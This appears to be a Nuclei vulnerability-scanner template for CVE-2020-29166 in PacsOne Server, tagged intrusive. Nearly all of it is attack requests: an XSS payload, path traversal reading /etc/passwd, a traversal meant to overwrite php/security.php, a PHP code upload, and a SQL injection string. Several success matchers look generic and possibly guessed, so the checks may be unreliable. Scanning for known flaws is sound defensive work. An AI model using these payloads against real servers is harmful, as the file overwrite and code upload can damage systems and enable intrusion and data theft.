id: CVE-2020-29166

info:
  name: PacsOne Server Multiple Vulnerabilities
  author: ProjectDiscoveryAI
  severity: high
  description: PacsOne Server (PACS Server In One Box) below 7.1.1 is affected by multiple vulnerabilities including XSS, arbitrary file manipulation, and SQL injection.
  impact: |
    Successful exploitation could result in unauthorized access or sensitive data exposure.
  remediation: |
    Apply the necessary patches provided by the vendor to mitigate the vulnerabilities.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-29166
    cwe-id: CWE-22
    epss-score: 0.01503
    epss-percentile: 0.87463
    cpe: cpe:2.3:a:rainbowfishsoftware:pacsone_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: rainbowfishsoftware
    product: pacsone_server
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/Pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E"

    matchers:
      - type: word
        words:
          - "<img src=\"\" onerror=\"alert(1);\">1</img>"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/Pacs/authenticate.php"

    body: "formUsername=../php/security.php"
    matchers:
      - type: word
        words:
          - "File overwritten"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/Pacs/encapsulatedDoc.php?file=../../../../etc/passwd"

    matchers:
      - type: word
        words:
          - "root:x:"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/Pacs/importWorklist.php"
      - "{{BaseURL}}/Pacs/uploadImage.php"

    body: "fileContent=<?php echo 'malicious code'; ?>"
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/Pacs/studyNotes.php?id=' OR '1'='1"

    matchers:
      - type: word
        words:
          - "SQL syntax error"
        part: body
